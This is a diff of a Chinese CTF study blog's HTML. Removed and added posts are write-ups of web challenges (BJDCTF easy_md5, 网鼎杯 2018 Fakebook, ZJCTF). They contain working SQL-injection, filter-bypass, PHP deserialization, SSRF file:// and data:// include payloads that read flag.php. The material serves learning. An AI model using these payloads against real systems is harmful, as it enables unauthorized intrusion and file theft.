-<p>当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password&#x3D;‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;1abcdefg&#x27;    ---&gt;  True</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;0abcdefg&#x27;    ---&gt;  False</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;1&#x27;           ---&gt;  True</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;2&#x27;           ---&gt;  True</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;0&#x27;           ---&gt;  False</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">for ($i = 0;;) &#123; </span><br><span class="line"> for ($c = 0; $c &lt; 1000000; $c++, $i++)</span><br><span class="line">  if (stripos(md5($i, true), &#x27;\&#x27;or\&#x27;&#x27;) !== false)</span><br><span class="line">   echo &quot;\nmd5($i) = &quot; . md5($i, true) . &quot;\n&quot;;</span><br><span class="line"> echo &quot;.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//引用于 http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</span><br></pre></td></tr></table></figure>
-
-<h1 id="其实我看不懂下面一段"><a href="#其实我看不懂下面一段" class="headerlink" title="*其实我看不懂下面一段"></a>*其实我看不懂下面一段</h1><p>这里提供一个最常用的：<strong>ffifdyop</strong>，该字符串md5加密后若md5()的参数为True时会返回 <strong>‘or’6<trash></strong> (<trash>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的<trash>会在MySQL将其转换成整型比较时丢掉)</p>
-<p>所以如果这里我们输入ffifdyop，后端的SQL语句会变成：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;6&lt;trash&gt;&#x27;           ---&gt;  True</span><br></pre></td></tr></table></figure>
-
-<img src="/2025/02/13/BJDCTF-2020-easy-md5-1/QQ20250213-135621.png" class="" title="QQ20250213-135621">
-
-<p>这个过滤我会过过过</p>
-<img src="/2025/02/13/BJDCTF-2020-easy-md5-1/QQ20250213-135937.png" class="" title="QQ20250213-135937">
-
-<h3 id="方法-1：利用已知的-MD5-碰撞"><a href="#方法-1：利用已知的-MD5-碰撞" class="headerlink" title="方法 1：利用已知的 MD5 碰撞"></a>方法 1：利用已知的 MD5 碰撞</h3><h3 id="方法-2：利用-PHP-的类型特性（如果条件允许）"><a href="#方法-2：利用-PHP-的类型特性（如果条件允许）" class="headerlink" title="方法 2：利用 PHP 的类型特性（如果条件允许）"></a>方法 2：利用 PHP 的类型特性（如果条件允许）</h3><p>数组绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>
-
-<p>在这种情况下：</p>
-<ul>
-<li><code>param1</code> 和 <code>param2</code> 都是数组，它们的值不同（<code>[1] !== [2]</code>）。</li>
-<li><code>md5(param1)</code> 和 <code>md5(param2)</code> 都返回 <code>null</code>，因此 <code>null === null</code> 为 <code>true</code>。</li>
-</ul>
-<p>BP一直抓的是上一次的包所以没成功太尴尬了</p>
-<h1 id="知识点总结：PHPmd5绕过"><a href="#知识点总结：PHPmd5绕过" class="headerlink" title="知识点总结：PHPmd5绕过"></a>知识点总结：PHPmd5绕过</h1><h2 id="两个等号-0e绕过（记录特殊值"><a href="#两个等号-0e绕过（记录特殊值" class="headerlink" title="两个等号 0e绕过（记录特殊值"></a>两个等号 0e绕过（记录特殊值</h2><h2 id="三个等号-数组绕过"><a href="#三个等号-数组绕过" class="headerlink" title="三个等号 数组绕过"></a>三个等号 数组绕过</h2><p>tags:</p>
-<ul>
-<li>md5</li>
-<li>弱比较</li>
-<li>强比较</li>
-<li>数组绕过</li>
-<li>PHP</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar_2.gif">
-      <meta itemprop="name" content="温柔刀">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CTF学习笔记">
-      <meta itemprop="description" content="JNU_WEB">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | CTF学习笔记">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/" class="post-title-link" itemprop="url">[网鼎杯 2018]Fakebook</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2025-02-12 17:53:11" itemprop="dateCreated datePublished" datetime="2025-02-12T17:53:11+08:00">2025-02-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-02-13 22:01:53" itemprop="dateModified" datetime="2025-02-13T22:01:53+08:00">2025-02-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-    <span class="post-meta-item-icon">
-      <i class="far fa-comment"></i>
-    </span>
-    <span class="post-meta-item-text">Waline：</span>
-  
-    <a title="waline" href="/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/#waline" itemprop="discussionUrl">
-      <span class="post-comments-count waline-comment-count" data-path="/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>768</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>3 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><img src="/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/image-20250212175352480.png" class="" title="image-20250212175352480">
-
-<p>访问robots.txt得到<code>user.php.bak</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); <span class="comment">#存在ssrf，可以使用file://协议读取文件内容</span></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里做不出来，偷偷看了一点wp，原来注册以后点用户名url会有注入点</p>
-<img src="/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/image-20250212175651466.png" class="" title="image-20250212175651466">
-
-<h2 id="预期解法"><a href="#预期解法" class="headerlink" title="预期解法"></a>预期解法</h2><p>我说为什么2’ –+不对 因为这是数字型注入…</p>
 <blockquote>
-<p>字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+<p>data:&#x2F;&#x2F;协议 需要allow_url_fopen,allow_url_include均为on 这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。常用代码如下：<code> http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt; text/plain</code>，表示的是文本 text&#x2F;plain;base64, 若纯文本没用可用base64编码 </p>
 </blockquote>
-<p>1’ 报错</p>
-<p>1 and 1&#x3D;1 正常</p>
-<p>1 and 1&#x3D;2 正常查询，但是跟上面不一样</p>
-<p>order by 查到5报错，说明有4列</p>
-<p>一输入union select 就提示“no hack”被过滤了</p>
-<p>别管了看一下wp</p>
-<p><code>union/**/select</code>绕过</p>
-<img src="/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/QQ20250212-191752.png" class="" title="QQ20250212-191752">
+<p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123; 这是检查text是不是=welcome to the zjctf</code></p>
+<p>我会写出<br>text&#x3D;welcome to the zjctf（这样的话“他会去打开”welcome to xxx”这个文件去读取”）<br>这种东西</p>
+<p>file get content 函数，读取文件里的内容</p>
+<p>data 协议就像是打开了一个文件，后面的数据就是文件里的数据</p>
+<p><code>userless.php</code>里没有反序列化函数，要借别人的。刚好 index.php 里有，还有 include。所以让 file&#x3D;userless.php，然后输入以下脚本输出的内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flagObj</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$flagObj</span>-&gt;file = <span class="string">&#x27;flag.php&#x27;</span>; <span class="comment">// 假设 test.txt 是一个存在的文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$flagObj</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>怎么报错了，你们这个wp是怎么写的啊我要告你们</p>
-<img src="/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/QQ20250212-193447.png" class="" title="QQ20250212-193447">
+<p><code>text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</code></p>
 
-<p>因为这里3.4报错了，1不知道在哪里，只能看见2，所以2是回显位，接下来的注入语句都会安排在2这个位置</p>
-<p>为什么、原理之类的…不知道</p>
-<h1 id="不知道的地方"><a href="#不知道的地方" class="headerlink" title="*不知道的地方"></a>*不知道的地方</h1><p>总之就是知道回显位了可以继续用group_concat了</p>
-<img src="/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/QQ20250212-201038.png" class="" title="QQ20250212-201038">
-
-<p>所以只有一张表users</p>
-<img src="/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/QQ20250212-201454.png" class="" title="QQ20250212-201454">
-
-<p>一定要警戒table_name后面跟的表名要加**’’**</p>
-<img src="/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/e106932a-ccff-4f70-8e7e-9c5b0fbc54f7.png" class="" title="e106932a-ccff-4f70-8e7e-9c5b0fbc54f7">
-
-<p>我已经忘记关键字要加反引号了&#96;&#96;</p>
-<p>（以下都是搬运wp的，看得懂）</p>
-<p>猜测flag为flag.php</p>
-<p>同时 curl存在ssrf，可以使用file:&#x2F;&#x2F;协议读取文件内容</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">UserInfo</span>());</span><br></pre></td></tr></table></figure>
-
-
-
-<p>得到</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>因为他是先查后反序列化（因为上面有报错）所以我们同样使用联合查询，将序列化内容放到相应的字段，就可以得到flag.php的内容</p>
-<p>payload:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=-<span class="number">1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/QQ20250212-211808.png" class="" title="QQ20250212-211808">
-
-<p>为什么只在源码里面？</p>
-<h2 id="非预期解法"><a href="#非预期解法" class="headerlink" title="非预期解法"></a>非预期解法</h2><img src="/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/QQ20250212-212134.png" class="" title="QQ20250212-212134">
-
-<p>查看数据库相关信息，发现为root权限</p>
-<p>root权限在已知绝对路径的情况下，可以使用load_file()函数直接读取文件内容。已知flag.php文件的绝对路径为&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<br>load_file()函数可以利用绝对路径去加载一个文件</p>
-<p>payload:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/view.php?no=-<span class="number">1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,<span class="title function_ invoke__">load_file</span>(<span class="string">&quot;/var/www/html/flag.php&quot;</span>),<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure>
-
-<img src="/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/QQ20250212-212340.png" class="" title="QQ20250212-212340">
-
-<p>因为是php文件，所以需要查看源码才能看见flag</p>
-<h1 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h1><p>sql注入读文件load_file 在root权限下</p>
-<p>union select 绕过&#x2F;**&#x2F;</p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感觉information_schema的命令不好记忆，看了这个形象一点</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_38972910/article/details/86012110">https://blog.csdn.net/weixin_38972910/article/details/86012110</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/11/%E6%B1%89%E5%A0%A1%E5%B8%88%E5%82%85%E8%AE%A1%E7%BD%91%E6%96%B9%E9%9D%A2%E7%81%B5%E9%AD%82%E6%8B%B7%E9%97%AE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar_2.gif">
-      <meta itemprop="name" content="温柔刀">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CTF学习笔记">
-      <meta itemprop="description" content="JNU_WEB">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | CTF学习笔记">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/02/11/%E6%B1%89%E5%A0%A1%E5%B8%88%E5%82%85%E8%AE%A1%E7%BD%91%E6%96%B9%E9%9D%A2%E7%81%B5%E9%AD%82%E6%8B%B7%E9%97%AE/" class="post-title-link" itemprop="url">汉堡师傅计网方面灵魂拷问</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2025-02-11 22:00:31" itemprop="dateCreated datePublished" datetime="2025-02-11T22:00:31+08:00">2025-02-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-02-20 21:59:41" itemprop="dateModified" datetime="2025-02-20T21:59:41+08:00">2025-02-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E8%AE%A1%E7%BD%91/" itemprop="url" rel="index"><span itemprop="name">计网</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-    <span class="post-meta-item-icon">
-      <i class="far fa-comment"></i>
-    </span>
-    <span class="post-meta-item-text">Waline：</span>
-  
-    <a title="waline" href="/2025/02/11/%E6%B1%89%E5%A0%A1%E5%B8%88%E5%82%85%E8%AE%A1%E7%BD%91%E6%96%B9%E9%9D%A2%E7%81%B5%E9%AD%82%E6%8B%B7%E9%97%AE/#waline" itemprop="discussionUrl">
-      <span class="post-comments-count waline-comment-count" data-path="/2025/02/11/%E6%B1%89%E5%A0%A1%E5%B8%88%E5%82%85%E8%AE%A1%E7%BD%91%E6%96%B9%E9%9D%A2%E7%81%B5%E9%AD%82%E6%8B%B7%E9%97%AE/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>359</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>现在你有以下需求：<br>1、假设你有多个需要上网的设备，同时你需要所有属于你的设备使用代理访问外网。有些设备不方便单独配置代理vpn，只能进行一些简单配置，如ip、网关<br>2、一般来说，一些路由器支持在路由器端直接配置代理，所有通过该路由器进行转发的包都会经过该代理<br>3、家里其他人需要上网，同时他们使用的网络服务都在国内不需要代理甚至不能配置代理</p>
-<p>你现在有两台路由器，你可以怎么进行配置进而满足你的需求呢？</p>
-<p>题目2：<br>1、有两个网络环境，一个是能访问互联网的路由器A，一个是全本地的局域网路由器B，你在局域网下部署有服务需要访问。<br>2、你只有一台电脑，你需要同时访问这两个网络环境，请问你应该如何配置？<br>附加：<br>如果路由器A和B的网段重合，你应该如何配置本机？</p>
-<p>题目3：有一台神秘设备连接在局域网内，你不能访问路由器后台，你应该如何获取该设备ip？ </p>
-<p>nmap用什么指令？指令是什么原理？</p>
-<h1 id="师傅还推荐用wireshark啊可惜你现在还是不太会用"><a href="#师傅还推荐用wireshark啊可惜你现在还是不太会用" class="headerlink" title="师傅还推荐用wireshark啊可惜你现在还是不太会用"></a>师傅还推荐用wireshark啊可惜你现在还是不太会用</h1>
       
     </div>
 
@@ -1445,14 +1348,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">52k</span>
+    <span title="站点总字数">53k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">3:10</span>
+    <span title="站点阅读时长">3:15</span>
   </span>
 </div>
 
